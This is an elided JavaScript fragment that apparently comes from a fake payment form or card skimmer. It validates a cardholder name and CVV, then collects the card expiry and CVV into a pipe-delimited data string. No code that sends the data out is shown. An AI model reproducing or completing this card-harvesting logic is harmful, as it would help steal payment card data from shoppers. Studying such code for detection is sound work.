...
_tables.fkbtn = function(state){
	switch(state){
		...
		case(1):
			...
			if(_tables.id('input.name').value.length < 3){
				noError = false;
		...
		case(2):
			...
			if(!/^[0-9]{3}$/igm.test(_tables.id('input.cvv').value)){
				noError = false; 
			...
			if(noError){
				...
				_tables.add('data','EXP: '+_tables.selected(_tables.id('input.exp.1')).text+'/'+_tables.selected(_tables.id('input.exp.2')).text+'|');
				_tables.add('data','CVV: '+_tables.id('input.cvv').value+'|');
